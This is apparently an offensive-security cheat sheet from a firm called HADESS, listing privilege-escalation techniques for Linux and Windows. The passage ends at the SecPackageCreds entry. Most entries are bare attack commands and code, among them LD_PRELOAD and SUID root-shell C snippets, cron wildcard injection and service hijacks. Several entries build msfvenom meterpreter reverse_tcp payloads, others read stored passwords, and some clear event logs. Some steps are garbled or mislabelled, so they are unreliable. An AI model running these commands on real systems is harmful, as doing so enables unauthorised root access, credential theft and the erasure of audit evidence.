## Overview

Some Privilege Escalation Methods.

Brought to you by:

<img src="https://hadess.io/wp-content/uploads/2022/06/logo-white.png" alt="HADESS" width="200"/>

[HADESS](https://hadess.io) performs offensive cybersecurity services through infrastructures and software that include vulnerability analysis, scenario attack planning, and implementation of custom integrated preventive projects. We organized our activities around the prevention of corporate, industrial, and laboratory cyber threats.

<!-- TOC start -->
- [DirtyC0w](#dirtyc0w)
- [CVE-2016-1531](#cve-2016-1531)
- [Polkit](#polkit)
- [DirtyPipe](#dirtypipe)
- [PwnKit](#pwnkit)
- [ms14_058](#ms14_058)
- [Hot Potato](#hot-potato)
- [Intel SYSRET](#intel-sysret)
- [PrintNightmare](#printnightmare)
- [Folina](#folina)
- [ALPC](#alpc)
- [RemotePotato0](#remotepotato0)
- [CVE-2022-26923](#cve-2022-26923)
- [MS14-068](#ms14-068)
- [Sudo LD_PRELOAD](#sudo-ld_preload)
- [Abusing File Permission via SUID Binaries - .so injection) ](#abusing-file-permission-via-suid-binaries-so-injection)
- [DLL Injection](#dll-injection)
- [Early Bird Injection](#early-bird-injection)
- [Process Injection through Memory Section](#process-injection-through-memory-section)
- [Abusing Scheduled Tasks via Cron Path Overwrite](#abusing-scheduled-tasks-via-cron-path-overwrite)
- [Abusing Scheduled Tasks via Cron Wildcards](#abusing-scheduled-tasks-via-cron-wildcards)
- [Abusing File Permission via SUID Binaries - Symlink) ](#abusing-file-permission-via-suid-binaries-symlink)
- [Abusing File Permission via SUID Binaries - Environment Variables \#1) ](#abusing-file-permission-via-suid-binaries-environment-variables-1)
- [Abusing File Permission via SUID Binaries - Environment Variables \#2) ](#abusing-file-permission-via-suid-binaries-environment-variables-2)
- [DLL Hijacking](#dll-hijacking)
- [Abusing Services via binPath](#abusing-services-via-binpath)
- [Abusing Services via Unquoted Path](#abusing-services-via-unquoted-path)
- [Abusing Services via Registry](#abusing-services-via-registry)
- [Abusing Services via Executable File](#abusing-services-via-executable-file)
- [Abusing Services via Autorun](#abusing-services-via-autorun)
- [Abusing Services via AlwaysInstallElevated](#abusing-services-via-alwaysinstallelevated)
- [Abusing Services via SeCreateToken](#abusing-services-via-secreatetoken)
- [Abusing Services via SeDebug](#abusing-services-via-sedebug)
- [Remote Process via Syscalls (HellsGate\|HalosGate)](#remote-process-via-syscalls-hellsgatehalosgate)
- [Escalate With DuplicateTokenEx](#escalate-with-duplicatetokenex)
- [Abusing Services via SeIncreaseBasePriority](#abusing-services-via-seincreasebasepriority)
- [Abusing Services via SeManageVolume](#abusing-services-via-semanagevolume)
- [Abusing Services via SeRelabel](#abusing-services-via-serelabel)
- [Abusing Services via SeRestore](#abusing-services-via-serestore)
- [Abuse via SeBackup](#abuse-via-sebackup)
- [Abusing via SeCreatePagefile](#abusing-via-secreatepagefile)
- [Abusing via SeSystemEnvironment ](#abusing-via-sesystemenvironment)
- [Abusing via SeTakeOwnership ](#abusing-via-setakeownership)
- [Abusing via SeTcb ](#abusing-via-setcb)
- [Abusing via SeTrustedCredManAccess ](#abusing-via-setrustedcredmanaccess)
- [Abusing tokens via SeAssignPrimaryToken](#abusing-tokens-via-seassignprimarytoken)
- [Abusing via SeCreatePagefile](#abusing-via-secreatepagefile-1)
- [Certificate Abuse](#certificate-abuse)
- [Password Mining in Memory](#password-mining-in-memory)
- [Password Mining in Memory](#password-mining-in-memory-1)
- [Password Mining in Registry](#password-mining-in-registry)
- [Password Mining in General Events via SeAudit](#password-mining-in-general-events-via-seaudit)
- [Password Mining in Security Events via SeSecurity](#password-mining-in-security-events-via-sesecurity)
- [Startup Applications](#startup-applications)
- [Password Mining in McAfeeSitelistFiles](#password-mining-in-mcafeesitelistfiles)
- [Password Mining in CachedGPPPassword](#password-mining-in-cachedgpppassword)
- [Password Mining in DomainGPPPassword](#password-mining-in-domaingpppassword)
- [Password Mining in KeePass](#password-mining-in-keepass)
- [Password Mining in WindowsVault](#password-mining-in-windowsvault)
- [Password Mining in SecPackageCreds](#password-mining-in-secpackagecreds)
- [Password Mining in PuttyHostKeys](#password-mining-in-puttyhostkeys)
- [Password Mining in RDCManFiles](#password-mining-in-rdcmanfiles)
- [Password Mining in RDPSavedConnections](#password-mining-in-rdpsavedconnections)
- [Password Mining in MasterKeys](#password-mining-in-masterkeys)
- [Password Mining in Browsers](#password-mining-in-browsers)
- [Password Mining in Files](#password-mining-in-files)
- [Password Mining in LDAP](#password-mining-in-ldap)
- [Password Mining in Clipboard](#password-mining-in-clipboard)
- [Password Mining in GMSA Password](#password-mining-in-gmsa-password)
- [Delegate tokens via RDP](#delegate-tokens-via-rdp)
- [Delegate tokens via FTP](#delegate-tokens-via-ftp)
- [Fake Logon Screen](#fake-logon-screen)
- [Abusing WinRM Services](#abusing-winrm-services)
- [Abusing Sudo Binaries](#abusing-sudo-binaries)
- [Abusing Scheduled Tasks](#abusing-scheduled-tasks)
- [Golden Ticket With Scheduled Tasks](#golden-ticket-with-scheduled-tasks)
- [Abusing Interpreter Capabilities](#abusing-interpreter-capabilities)
- [Abusing Binary Capabilities](#abusing-binary-capabilities)
- [Abusing ActiveSessions Capabilities](#abusing-activesessions-capabilities)
- [Escalate with TRUSTWORTHY in SQL Server](#escalate-with-trustworthy-in-sql-server)
- [Abusing Mysql run as root](#abusing-mysql-run-as-root)
- [Abusing journalctl](#abusing-journalctl)
- [Abusing VDS](#abusing-vds)
- [Abusing Browser](#abusing-browser)
- [Abusing LDAP](#abusing-ldap)
- [LLMNR Poisoning](#llmnr-poisoning)
- [Abusing Certificate Services](#abusing-certificate-services)
- [MySQL UDF Code Injection](#mysql-udf-code-injection)
- [Impersonation Token with ImpersonateLoggedOnuser](#impersonation-token-with-impersonateloggedonuser)
- [Impersonation Token with SeImpersontePrivilege](#impersonation-token-with-seimpersonteprivilege)
- [Impersonation Token with SeLoadDriverPrivilege](#impersonation-token-with-seloaddriverprivilege)
- [OpenVPN Credentials](#openvpn-credentials)
- [Bash History](#bash-history)
- [Package Capture](#package-capture)
- [NFS Root Squashing](#nfs-root-squashing)
- [Abusing Access Control List](#abusing-access-control-list)
- [Escalate With SeBackupPrivilege](#escalate-with-sebackupprivilege)
- [Escalate With SeImpersonatePrivilege](#escalate-with-seimpersonateprivilege)
- [Escalate With SeLoadDriverPrivilege](#escalate-with-seloaddriverprivilege)
- [Escalate With ForceChangePassword](#escalate-with-forcechangepassword)
- [Escalate With GenericWrite](#escalate-with-genericwrite)
- [Abusing GPO](#abusing-gpo)
- [Pass-the-Ticket](#pass-the-ticket)
- [Golden Ticket](#golden-ticket)
- [Abusing Splunk Universal Forwarder](#abusing-splunk-universal-forwarder)
- [Abusing Gdbus](#abusing-gdbus)
- [Abusing Trusted DC](#abusing-trusted-dc)
- [NTLM Relay ](#ntlm-relay)
- [Exchange Relay ](#exchange-relay)
- [Dumping with diskshadow](#dumping-with-diskshadow)
- [Dumping with vssadmin](#dumping-with-vssadmin)
- [Password Spraying](#password-spraying)
- [AS-REP Roasting](#as-rep-roasting)
- [Kerberoasting](#kerberoasting)
- [Dump lsass with SilentProcessExit](#dump-lsass-with-silentprocessexit)
- [Lsass Shtinkering](#lsass-shtinkering)
- [AndrewSpecial](#andrewspecial)
- [CCACHE ticket reuse from /tmp](#ccache-ticket-reuse-from-tmp)
- [CCACHE ticket reuse from keyring](#ccache-ticket-reuse-from-keyring)
- [CCACHE ticket reuse from SSSD KCM](#ccache-ticket-reuse-from-sssd-kcm)
- [CCACHE ticket reuse from keytab](#ccache-ticket-reuse-from-keytab)
- [SSH Forwarder](#ssh-forwarder)
- [DLL Search Order Hijacking](#dll-search-order-hijacking)
- [Slui File Handler Hijack LPE](#slui-file-handler-hijack-lpe)
- [CDPSvc DLL Hijacking](#cdpsvc-dll-hijacking)
- [Magnify.exe Dll Search Order Hijacking](#magnifyexe-dll-search-order-hijacking)
- [CdpSvc Service ](#cdpsvc-service)
- [HiveNightmare](#hivenightmare)
- [Abusing with FileRestorePrivilege](#abusing-with-filerestoreprivilege)
- [Abusing with RestoreAndBackupPrivileges](#abusing-with-restoreandbackupprivileges)
- [Abusing with ShadowCopyBackupPrivilege](#abusing-with-shadowcopybackupprivilege)
- [Abusing with ShadowCopy](#abusing-with-shadowcopy)
- [Dynamic Phishing](#dynamic-phishing)
- [Race Conditions](#race-conditions)
- [Abusing usermode helper API](#abusing-usermode-helper-api)
- [Escape only with CAP_SYS_ADMIN capability](#escape-only-with-cap_sys_admin-capability)
- [Abusing exposed host directories](#abusing-exposed-host-directories)
- [Unix Wildcard](#unix-wildcard)
- [Socket Command Injection](#socket-command-injection)
- [Logstash](#logstash)
- [UsoDllLoader](#usodllloader)
- [Trend Chain Methods for Privilege Escalation ](#trend-chain-methods-for-privilege-escalation)
- [Habanero Chilli](#habanero-chilli)
- [Padron Chilli](#padron-chilli)
- [Jalapeno Chillies](#jalapeno-chillies)
- [Pasilla Chili](#pasilla-chili)
- [Finger Chilli](#finger-chilli)
- [Orange Cayenne](#orange-cayenne)
- [Red Cayenne](#red-cayenne)
- [Birds Eye Chilli](#birds-eye-chilli)
- [Scotch Bonnet](#scotch-bonnet)
- [Lemon Habanero](#lemon-habanero)
- [Red Habanero](#red-habanero)
- [Ghost Pepper](#ghost-pepper)
- [Chocolate Scorpion Chilli](#chocolate-scorpion-chilli)
- [Carolina Reaper](#carolina-reaper)
- [The Intimidator Chilli](#the-intimidator-chilli)
<!-- TOC end -->
Methods for Privilege Escalation

<!-- TOC --><a name="dirtyc0w"></a>
# DirtyC0w

Domain: No

Local Admin: Yes

OS: Linux

Type: 0/1 Exploit

Methods:

1.  gcc -pthread c0w.c -o c0w; ./c0w; passwd; id

<!-- TOC --><a name="cve-2016-1531"></a>
# CVE-2016-1531

Domain: No

Local Admin: Yes

OS: Linux

Type: 0/1 Exploit

Methods:

2.  CVE-2016-1531.sh;id

<!-- TOC --><a name="polkit"></a>
# Polkit

Domain: No

Local Admin: Yes

OS: Linux

Type: 0/1 Exploit

Methods:

1\.

https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation

2\.

poc.sh

<!-- TOC --><a name="dirtypipe"></a>
# DirtyPipe

Domain: No

Local Admin: Yes

OS: Linux

Type: 0/1 Exploit

Methods:

1\.

./traitor-amd64 \--exploit kernel:CVE-2022-0847

2\.

Whoami;id

<!-- TOC --><a name="pwnkit"></a>
# PwnKit

Domain: No

Local Admin: Yes

OS: Linux

Type: 0/1 Exploit

Methods:

1\.

./cve-2021-4034

2\.

Whoami;id

<!-- TOC --><a name="ms14_058"></a>
# ms14_058

Domain: No

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

msf \> use exploit/windows/local/ms14_058_track_popup_menu

msf exploit(ms14_058_track_popup_menu) \> set TARGET \< target-id \>

msf exploit(ms14_058_track_popup_menu) \> exploit

<!-- TOC --><a name="hot-potato"></a>
# Hot Potato

Domain: No

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

1\.

In command prompt type: powershell.exe -nop -ep bypass

2\.

In Power Shell prompt type: Import-Module
C:\\Users\\User\\Desktop\\Tools\\Tater\\Tater.ps1

3\.

In Power Shell prompt type: Invoke-Tater -Trigger 1 -Command \"net
localgroup

administrators user /add\"

4\.

To confirm that the attack was successful, in Power Shell prompt type:

net localgroup administrators

<!-- TOC --><a name="intel-sysret"></a>
# Intel SYSRET

Domain: No

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

1\.

execute -H -f sysret.exe -a \"-pid \[pid\]"

<!-- TOC --><a name="printnightmare"></a>
# PrintNightmare

Domain: Yes

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

1\.

https://github.com/outflanknl/PrintNightmare

2\.

PrintNightmare 10.10.10.10 exp.dll

<!-- TOC --><a name="folina"></a>
# Folina

Domain: Y/N

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

1\.

https://github.com/JohnHammond/msdt-follina

2\.

python3 follina.py -c \"notepad\"

<!-- TOC --><a name="alpc"></a>
# ALPC

Domain: Y/N

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

1\.

https://github.com/riparino/Task_Scheduler_ALPC

<!-- TOC --><a name="remotepotato0"></a>
# RemotePotato0

Domain: Y/N

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

1\.

sudo ntlmrelayx.py -t ldap://10.0.0.10 \--no-wcf-server \--escalate-user
normal_user

2\.

.\\RemotePotato0.exe -m 0 -r 10.0.0.20 -x 10.0.0.20 -p 9999 -s 1

<!-- TOC --><a name="cve-2022-26923"></a>
# CVE-2022-26923

Domain: Y/N

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

1\.

certipy req \'lab.local/cve\$:CVEPassword1234\*\@10.100.10.13\'
-template Machine -dc-ip 10.10.10.10 -ca lab-ADCS-CA

2\.

Rubeus.exe asktgt /user:\"TARGET_SAMNAME\" /certificate:cert.pfx
/password:\"CERTIFICATE_PASSWORD\" /domain:\"FQDN_DOMAIN\"
/dc:\"DOMAIN_CONTROLLER\" /show

<!-- TOC --><a name="ms14-068"></a>
# MS14-068

Domain: Y/N

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

1\.

python ms14-068.py -u user-a-1\@dom-a.loc -s
S-1-5-21-557603841-771695929-1514560438-1103 -d dc-a-2003.dom-a.loc

<!-- TOC --><a name="sudo-ld_preload"></a>
# Sudo LD_PRELOAD

Domain: No

Local Admin: Yes

OS: Linux

Type: Injection

Methods:

\#include \<stdio.h\>

\#include \<sys/types.h\>

\#include \<stdlib.h\>

1\. void \_init() {

unsetenv(\"LD_PRELOAD\");

setgid(0);

setuid(0);

system(\"/bin/bash\");

}

2\.

gcc -fPIC -shared -o /tmp/ldreload.so ldreload.c -nostartfiles

3\.

sudo LD_RELOAD=tmp/ldreload.so apache2

4\.

id

<!-- TOC --><a name="abusing-file-permission-via-suid-binaries-so-injection"></a>
# Abusing File Permission via SUID Binaries - .so injection) 

Domain: No

Local Admin: Yes

OS: Linux

Type: Injection

Methods:

1\.

Mkdir /home/user/.config

2\.

\#include \<stdio.h\>

\#include \<stdlib.h\>

static void inject() \_attribute \_((constructor));

void inject() {

system(\"cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash
-p\");

}

3\.

gcc -shared -o /home/user/.config/libcalc.so
-fPIC/home/user/.config/libcalc.c

4\.

/usr/local/bin/suid-so

5\.

id

<!-- TOC --><a name="dll-injection"></a>
# DLL Injection

Domain: No

Local Admin: Yes

OS: Windows

Type: Injection

Methods:

1\.

RemoteDLLInjector64

Or

MemJect

Or

https://github.com/tomcarver16/BOF-DLL-Inject

2\.

\#define PROCESS_NAME \"csgo.exe\"

Or

RemoteDLLInjector64.exe pid C:\\runforpriv.dll

Or

mandllinjection ./runforpriv.dll pid

<!-- TOC --><a name="early-bird-injection"></a>
# Early Bird Injection

Domain: No

Local Admin: Yes

OS: Windows

Type: Injection

Methods:

1\.

hollow svchost.exe pop.bin

<!-- TOC --><a name="process-injection-through-memory-section"></a>
# Process Injection through Memory Section

Domain: No

Local Admin: Yes

OS: Windows

Type: Injection

Methods:

1\.

sec-shinject PID /path/to/bin

<!-- TOC --><a name="abusing-scheduled-tasks-via-cron-path-overwrite"></a>
# Abusing Scheduled Tasks via Cron Path Overwrite

Domain: No

Local Admin: Yes

OS: Linux

Type: Abusing Scheduled Tasks

Methods:

1.  echo \'cp /bin/bash /tmp/bash; chmod +s /tmp/bash\' \>
    > systemupdate.sh;

2.  chmod +x systemupdate.sh

3.  Wait a while

4.  /tmp/bash -p

5.  id && whoami

<!-- TOC --><a name="abusing-scheduled-tasks-via-cron-wildcards"></a>
# Abusing Scheduled Tasks via Cron Wildcards

Domain: No

Local Admin: Yes

OS: Linux

Type: Abusing Scheduled Tasks

Methods:

6.  echo \'cp /bin/bash /tmp/bash; chmod +s /tmp/bash\' \>
    > /home/user/systemupdate.sh;

7.  touch /home/user/ \--checkpoint=1;

8.  touch /home/user/ \--checkpoint-action=exec=sh\\systemupdate.sh

9.  Wait a while

10. /tmp/bash -p

11. id && whoami

<!-- TOC --><a name="abusing-file-permission-via-suid-binaries-symlink"></a>
# Abusing File Permission via SUID Binaries - Symlink) 

Domain: No

Local Admin: Yes

OS: Linux

Type: Abusing File Permission

Methods:

1\.

su - www-data;

2\.

nginxed-root.sh /var/log/nginx/error.log;

3\.

In root user

invoke-rc.d nginx rotate \>/dev/null 2\>&1

<!-- TOC --><a name="abusing-file-permission-via-suid-binaries-environment-variables-1"></a>
# Abusing File Permission via SUID Binaries - Environment Variables \#1) 

Domain: No

Local Admin: Yes

OS: Linux

Type: Abusing File Permission

Methods:

1\.

echo \'int main() { setgid(0); setuid(0); system(\"/bin/bash\"); return
0; }\' \>/tmp/service.c;

2\.

gcc /tmp/services.c -o /tmp/service;

3\.

export PATH=/tmp:\$PATH;

4\.

/usr/local/bin/sudi-env; id

<!-- TOC --><a name="abusing-file-permission-via-suid-binaries-environment-variables-2"></a>
# Abusing File Permission via SUID Binaries - Environment Variables \#2) 

Domain: No

Local Admin: Yes

OS: Linux

Type: Abusing File Permission

Methods:

1\.

env -i SHELLOPTS=xtrace PS4=\'\$(cp /bin/bash /tmp && chown root.root
/tmp/bash && chmod +S /tmp/bash)\' /bin/sh -c /usr/local/bin/suid-env2;
set +x; /tmp/bash -p\'

<!-- TOC --><a name="dll-hijacking"></a>
# DLL Hijacking

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

Windows_dll.c:

cmd.exe /k net localgroup administrators user /add

2\.

x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll

3\.

sc stop dllsvc & sc start dllsvc

<!-- TOC --><a name="abusing-services-via-binpath"></a>
# Abusing Services via binPath

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

sc config daclsvc binpath= \"net localgroup administrators user /add\"

2\.

sc start daclsvc

<!-- TOC --><a name="abusing-services-via-unquoted-path"></a>
# Abusing Services via Unquoted Path

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

msfvenom -p windows/exec CMD=\'net localgroup administrators user /add\'
-f exe-service -o

common.exe

2\.

Place common.exe in 'C:\\Program Files\\Unquoted Path Service'.

3\.

sc start unquotedsvc

<!-- TOC --><a name="abusing-services-via-registry"></a>
# Abusing Services via Registry

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath
/t

REG_EXPAND_SZ /d c:\\temp\\x.exe /f

2\.

sc start regsvc

<!-- TOC --><a name="abusing-services-via-executable-file"></a>
# Abusing Services via Executable File

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

copy /y c:\\Temp\\x.exe \"c:\\Program Files\\File Permissions
Service\\filepermservice.exe\"

2\.

sc start filepermsvc

<!-- TOC --><a name="abusing-services-via-autorun"></a>
# Abusing Services via Autorun

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

In Metasploit (msf \> prompt) type: use multi/handler

In Metasploit (msf \> prompt) type: set payload
windows/meterpreter/reverse_tcp

In Metasploit (msf \> prompt) type: set lhost \[Kali VM IP Address\]

In Metasploit (msf \> prompt) type: run

Open an additional command prompt and type:

msfvenom -p windows/meterpreter/reverse_tcp lhost=\[Kali VM IP Address\]
-f exe -o

program.exe

2\.

Place program.exe in 'C:\\Program Files\\Autorun Program'.

<!-- TOC --><a name="abusing-services-via-alwaysinstallelevated"></a>
# Abusing Services via AlwaysInstallElevated

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

msfvenom -p windows/exec CMD=\'net localgroup

administrators user /add\' -f msi-nouac -o setup.msi

2\.

msiexec /quiet /qn /i C:\\Temp\\setup.msi

Or

SharpUp.exe AlwaysInstallElevated

<!-- TOC --><a name="abusing-services-via-secreatetoken"></a>
# Abusing Services via SeCreateToken

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

.load C:\\dev\\PrivEditor\\x64\\Release\\PrivEditor.dll

2\.

!rmpriv

<!-- TOC --><a name="abusing-services-via-sedebug"></a>
# Abusing Services via SeDebug

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

Conjure-LSASS

Or

syscall_enable_priv 20

<!-- TOC --><a name="remote-process-via-syscalls-hellsgatehalosgate"></a>
# Remote Process via Syscalls (HellsGate\|HalosGate)

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

injectEtwBypass pid

<!-- TOC --><a name="escalate-with-duplicatetokenex"></a>
# Escalate With DuplicateTokenEx

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

PrimaryTokenTheft.exe pid

Or

TokenPlaye.exe \--impersonate \--pid pid

<!-- TOC --><a name="abusing-services-via-seincreasebasepriority"></a>
# Abusing Services via SeIncreaseBasePriority

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

start /realtime SomeCpuIntensiveApp.exe

<!-- TOC --><a name="abusing-services-via-semanagevolume"></a>
# Abusing Services via SeManageVolume

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

Just only compile and run SeManageVolumeAbuse

<!-- TOC --><a name="abusing-services-via-serelabel"></a>
# Abusing Services via SeRelabel

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

WRITE_OWNER access to a resource, including files and folders.

2\.

Run for privilege escalation

<!-- TOC --><a name="abusing-services-via-serestore"></a>
# Abusing Services via SeRestore

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\. Launch PowerShell/ISE with the SeRestore privilege present.

2\. Enable the privilege with Enable-SeRestorePrivilege).

3\. Rename utilman.exe to utilman.old

4\. Rename cmd.exe to utilman.exe

5\. Lock the console and press Win+U

<!-- TOC --><a name="abuse-via-sebackup"></a>
# Abuse via SeBackup

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

In Metasploit (msf \> prompt) type: use
auxiliary/server/capture/http_basic

In Metasploit (msf \> prompt) type: set uripath x

In Metasploit (msf \> prompt) type: run

2\.

In taskmgr and right-click on the "iexplore.exe" in the "Image Name"
column

and select "Create Dump File" from the popup menu.

3\.

strings /root/Desktop/iexplore.DMP \| grep \"Authorization: Basic\"

Select the Copy the Base64 encoded string.

In command prompt type: echo -ne \[Base64 String\] \| base64 -d

<!-- TOC --><a name="abusing-via-secreatepagefile"></a>
# Abusing via SeCreatePagefile

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

HIBR2BIN /PLATFORM X64 /MAJOR 6 /MINOR 1 /INPUT hiberfil.sys /OUTPUT
uncompressed.bin

<!-- TOC --><a name="abusing-via-sesystemenvironment"></a>
# Abusing via SeSystemEnvironment 

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

.load C:\\dev\\PrivEditor\\x64\\Release\\PrivEditor.dll

2\.

TrustExec.exe -m exec -c \"whoami /priv\" -f

<!-- TOC --><a name="abusing-via-setakeownership"></a>
# Abusing via SeTakeOwnership 

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\. takeown.exe /f \"%windir%\\system32\"

2\. icalcs.exe \"%windir%\\system32\" /grant \"%username%\":F

3\. Rename cmd.exe to utilman.exe

4\. Lock the console and press Win+U

<!-- TOC --><a name="abusing-via-setcb"></a>
# Abusing via SeTcb 

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

PSBits

Or

PrivFu

2\.

psexec.exe -i -s -d cmd.exe

<!-- TOC --><a name="abusing-via-setrustedcredmanaccess"></a>
# Abusing via SeTrustedCredManAccess 

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

.load C:\\dev\\PrivEditor\\x64\\Release\\PrivEditor.dll

Or

CredManBOF

2\.

TrustExec.exe -m exec -c \"whoami /priv\" -f

<!-- TOC --><a name="abusing-tokens-via-seassignprimarytoken"></a>
# Abusing tokens via SeAssignPrimaryToken

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

JuicyPotato.exe

Or

https://github.com/decoder-it/juicy_2

https://github.com/antonioCoco/RoguePotato

<!-- TOC --><a name="abusing-via-secreatepagefile-1"></a>
# Abusing via SeCreatePagefile

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1\.

./WELA.ps1 -LogFile .\\Security.evtx -EventIDStatistics

2\.

flog -s 10s -n 200

Or

invoke-module LogCleaner.ps1

<!-- TOC --><a name="certificate-abuse"></a>
# Certificate Abuse

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Abusing Certificate

Methods:

1\.

ceritify.exe request /ca:dc.domain.local\\DC-CA /template:User...

2\.

Rubeus.exe asktgy /user:CORP\\itadmin /certificate:C:\\cert.pfx
/password:password

<!-- TOC --><a name="password-mining-in-memory"></a>
# Password Mining in Memory

Domain: No

Local Admin: Yes

OS: Linux

Type: Enumeration & Hunt

Methods:

3.  ps -ef \| grep ftp;

4.  gdp -p ftp_id

5.  info proc mappings

6.  q

7.  dump memory /tmp/mem \[start\] \[end\]

8.  q

9.  strings /tmp/mem \| grep passw

<!-- TOC --><a name="password-mining-in-memory-1"></a>
# Password Mining in Memory

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

In Metasploit (msf \> prompt) type: use
auxiliary/server/capture/http_basic

In Metasploit (msf \> prompt) type: set uripath x

In Metasploit (msf \> prompt) type: run

2\.

In taskmgr and right-click on the "iexplore.exe" in the "Image Name"
column

and select "Create Dump File" from the popup menu.

3\.

strings /root/Desktop/iexplore.DMP \| grep \"Authorization: Basic\"

Select the Copy the Base64 encoded string.

In command prompt type: echo -ne \[Base64 String\] \| base64 -d

<!-- TOC --><a name="password-mining-in-registry"></a>
# Password Mining in Registry

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

Open command and type:

reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows
NT\\CurrentVersion\\Winlogon\" /v

DefaultUsername

2\.

In command prompt type:

reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows
NT\\CurrentVersion\\Winlogon\" /v

DefaultPassword

3\.

Notice the credentials, from the output.

4\.

In command prompt type:

reg query
HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\BWP123F42

-v ProxyUsername

5\.

In command prompt type:

reg query
HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\BWP123F42

-v ProxyPassword

6\. Notice the credentials, from the output.

7\.

In command prompt type:

reg query HKEY_CURRENT_USER\\Software\\TightVNC\\Server /v Password

8\.

In command prompt type:

reg query HKEY_CURRENT_USER\\Software\\TightVNC\\Server /v
PasswordViewOnly

9\.

Make note of the encrypted passwords and type:

C:\\Users\\User\\Desktop\\Tools\\vncpwd\\vncpwd.exe \[Encrypted
Password\]

10\.

From the output, make note of the credentials.

<!-- TOC --><a name="password-mining-in-general-events-via-seaudit"></a>
# Password Mining in General Events via SeAudit

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

./WELA.ps1 -LogFile .\\Security.evtx -EventIDStatistics

2\.

flog -s 10s -n 200

Or

invoke-module LogCleaner.ps1

<!-- TOC --><a name="password-mining-in-security-events-via-sesecurity"></a>
# Password Mining in Security Events via SeSecurity

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

./WELA.ps1 -LogFile .\\Security.evtx -EventIDStatistics

2\.

flog -s 10s -n 200

Or

wevtutil cl Security

<!-- TOC --><a name="startup-applications"></a>
# Startup Applications

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

In Metasploit (msf \> prompt) type: use multi/handler

In Metasploit (msf \> prompt) type: set payload
windows/meterpreter/reverse_tcp

In Metasploit (msf \> prompt) type: set lhost \[Kali VM IP Address\]

In Metasploit (msf \> prompt) type: run

Open another command prompt and type:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=\[Kali VM IP Address\]
-f exe -o

x.exe

2\.

Place x.exe in "C:\\ProgramData\\Microsoft\\Windows\\Start
Menu\\Programs\\Startup".

<!-- TOC --><a name="password-mining-in-mcafeesitelistfiles"></a>
# Password Mining in McAfeeSitelistFiles

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

SharpUp.exe McAfeeSitelistFiles

<!-- TOC --><a name="password-mining-in-cachedgpppassword"></a>
# Password Mining in CachedGPPPassword

Domain: Y/N

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

SharpUp.exe CachedGPPPassword

<!-- TOC --><a name="password-mining-in-domaingpppassword"></a>
# Password Mining in DomainGPPPassword

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

SharpUp.exe DomainGPPPassword

<!-- TOC --><a name="password-mining-in-keepass"></a>
# Password Mining in KeePass

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

Seatbelt.exe keepass

Or

KeeTheft.exe

<!-- TOC --><a name="password-mining-in-windowsvault"></a>
# Password Mining in WindowsVault

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

Seatbelt.exe WindowsVault

<!-- TOC --><a name="password-mining-in-secpackagecreds"></a>
# Password Mining in SecPackageCreds

Domain: No

Local Admin: Yes
